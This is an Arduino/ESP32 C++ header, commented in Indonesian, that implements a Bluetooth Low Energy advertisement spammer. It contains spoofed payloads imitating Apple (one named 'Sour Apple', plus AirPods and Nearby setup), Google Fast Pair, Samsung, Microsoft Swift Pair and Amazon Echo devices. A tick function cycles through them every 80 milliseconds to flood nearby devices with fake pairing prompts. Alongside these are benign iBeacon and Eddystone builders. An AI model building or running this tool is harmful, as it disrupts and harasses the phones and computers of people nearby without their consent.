#ifndef BT_SPAM_H
#define BT_SPAM_H

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>

static BLEServer*      g_bleServer = nullptr;
static BLEAdvertising* g_bleAdv    = nullptr;
static bool            g_bleActive = false;
static bool            g_bleFixed  = false;   // mode payload tetap (raw/iBeacon/Eddystone)
static std::string     g_bleFixedData;         // isi advertisement tetap

static const uint8_t SOUR_APPLE[] = {
  0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E,
  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t APPLE_NEARBY_SETUP[] = {
  0x1E, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x09,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t APPLE_NEARBY_WIFI[] = {
  0x1E, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x0B,
  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t GOOGLE_FASTPAIR[] = {
  0x02, 0x01, 0x06,
  0x03, 0x03, 0x2C, 0xFE,
  0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00
};

static const uint8_t SAMSUNG_TAG[] = {
  0x1E, 0xFF, 0x75, 0x00, 0x00, 0x01, 0x02, 0x03,
  0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
  0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13,
  0x14, 0x15, 0x16, 0x17, 0x18, 0x19
};

static const uint8_t MICROSOFT_SWIFTPAIR[] = {
  0x02, 0x01, 0x06,
  0x03, 0x03, 0xD4, 0xFE
};

static const uint8_t APPLE_AIRPODS[] = {
  0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02,
  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t AMAZON_ECHO[] = {
  0x1E, 0xFF, 0x7E, 0x01, 0x00, 0x01, 0x02, 0x03,
  0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
  0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13,
  0x14, 0x15, 0x16, 0x17, 0x18, 0x19
};

// UUID default untuk iBeacon
static const uint8_t IBEACON_DEFAULT_UUID[16] = {
  0xE2,0x0A,0x39,0xF4,0x73,0xF5,0x4B,0xC4,
  0xA1,0x2F,0x17,0xD1,0xAD,0x07,0xA9,0x61
};

// Namespace + instance default untuk Eddystone-UID
static const uint8_t EDDYSTONE_NS[10] = {0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09};
static const uint8_t EDDYSTONE_INST[6] = {0x0A,0x0B,0x0C,0x0D,0x0E,0x0F};

// Build iBeacon advertisement (Apple iBeacon). Returns panjang payload.
inline size_t buildIBeacon(uint8_t* out, const uint8_t uuid[16], uint16_t major, uint16_t minor, int8_t txPower) {
  size_t p = 0;
  out[p++] = 0x02; out[p++] = 0x01; out[p++] = 0x06;   // flags
  out[p++] = 0x1A; out[p++] = 0xFF;                     // manufacturer specific, len 26
  out[p++] = 0x4C; out[p++] = 0x00;                     // Apple company ID
  out[p++] = 0x02; out[p++] = 0x15;                     // iBeacon type + length
  memcpy(&out[p], uuid, 16); p += 16;
  out[p++] = (uint8_t)((major >> 8) & 0xFF);
  out[p++] = (uint8_t)(major & 0xFF);
  out[p++] = (uint8_t)((minor >> 8) & 0xFF);
  out[p++] = (uint8_t)(minor & 0xFF);
  out[p++] = (uint8_t)txPower;
  return p;
}

// Build Eddystone-UID advertisement. Returns panjang payload.
inline size_t buildEddystoneUID(uint8_t* out, const uint8_t ns[10], const uint8_t inst[6], int8_t txPower) {
  size_t p = 0;
  out[p++] = 0x02; out[p++] = 0x01; out[p++] = 0x06;   // flags
  out[p++] = 0x03; out[p++] = 0x03; out[p++] = 0xAA; out[p++] = 0xFE;   // 16-bit service UUID
  out[p++] = 0x16; out[p++] = 0xAA; out[p++] = 0xFE;                     // service data
  out[p++] = 0x00;                                     // frame type = UID
  out[p++] = (uint8_t)txPower;
  memcpy(&out[p], ns, 10); p += 10;
  memcpy(&out[p], inst, 6); p += 6;
  return p;
}

inline bool btSpamInit() {
  if (g_bleActive) return true;

  BLEDevice::init("BT_Spam");
  g_bleServer = BLEDevice::createServer();
  g_bleAdv    = BLEDevice::getAdvertising();

  if (!g_bleServer || !g_bleAdv) {
    BLEDevice::deinit(true);
    g_bleServer = nullptr;
    g_bleAdv    = nullptr;
    return false;
  }

  g_bleActive = true;
  return true;
}

inline void btAdvertisePayload(const std::string& data) {
  if (!g_bleActive || !g_bleAdv) return;
  g_bleAdv->stop();
  BLEAdvertisementData advData;
  advData.addData(data);
  g_bleAdv->setAdvertisementData(advData);
  g_bleAdv->setScanResponse(false);
  g_bleAdv->setMinInterval(0x20);
  g_bleAdv->setMaxInterval(0x20);
  g_bleAdv->start();
}

inline void btSpamTick() {
  if (!g_bleActive || !g_bleAdv) return;
  if (g_bleFixed) return;  // payload tetap sudah diiklankan

  static unsigned long lastRotate = 0;
  static uint8_t mode = 0;

  if (millis() - lastRotate < 80) return;
  lastRotate = millis();

  std::string data;
  switch (mode % 10) {
    case 0: data.assign((const char*)SOUR_APPLE,         sizeof(SOUR_APPLE));         break;
    case 1: data.assign((const char*)APPLE_NEARBY_SETUP, sizeof(APPLE_NEARBY_SETUP)); break;
    case 2: data.assign((const char*)APPLE_NEARBY_WIFI,  sizeof(APPLE_NEARBY_WIFI));  break;
    case 3: data.assign((const char*)GOOGLE_FASTPAIR,    sizeof(GOOGLE_FASTPAIR));    break;
    case 4: data.assign((const char*)SAMSUNG_TAG,        sizeof(SAMSUNG_TAG));        break;
    case 5: data.assign((const char*)MICROSOFT_SWIFTPAIR,sizeof(MICROSOFT_SWIFTPAIR));break;
    case 6: data.assign((const char*)APPLE_AIRPODS,      sizeof(APPLE_AIRPODS));      break;
    case 7: data.assign((const char*)AMAZON_ECHO,        sizeof(AMAZON_ECHO));        break;
    case 8: {
      uint8_t b[32];
      size_t n = buildIBeacon(b, IBEACON_DEFAULT_UUID, 1, 2, -59);
      data.assign((const char*)b, n);
      break;
    }
    case 9: {
      uint8_t b[32];
      size_t n = buildEddystoneUID(b, EDDYSTONE_NS, EDDYSTONE_INST, -59);
      data.assign((const char*)b, n);
      break;
    }
  }

  btAdvertisePayload(data);
  mode++;
}

// Mulai advertise payload tetap (raw hex yang sudah di-decode)
inline bool btStartFixed(const uint8_t* data, size_t len) {
  if (len == 0 || len > 31) return false;
  if (!btSpamInit()) return false;
  g_bleFixedData.assign((const char*)data, len);
  g_bleFixed = true;
  btAdvertisePayload(g_bleFixedData);
  return true;
}

inline bool btStartIBeacon(const uint8_t uuid[16], uint16_t major, uint16_t minor, int8_t txPower) {
  uint8_t b[32];
  size_t n = buildIBeacon(b, uuid, major, minor, txPower);
  return btStartFixed(b, n);
}

inline bool btStartEddystone(const uint8_t ns[10], const uint8_t inst[6], int8_t txPower) {
  uint8_t b[32];
  size_t n = buildEddystoneUID(b, ns, inst, txPower);
  return btStartFixed(b, n);
}

inline void btStopFixed() {
  g_bleFixed = false;
  g_bleFixedData.clear();
}

inline void btSpamStop() {
  btStopFixed();
  if (g_bleAdv) {
    g_bleAdv->stop();
    g_bleAdv = nullptr;
  }
  if (g_bleActive) {
    BLEDevice::deinit(true);
    g_bleActive = false;
    g_bleServer = nullptr;
  }
}

#endif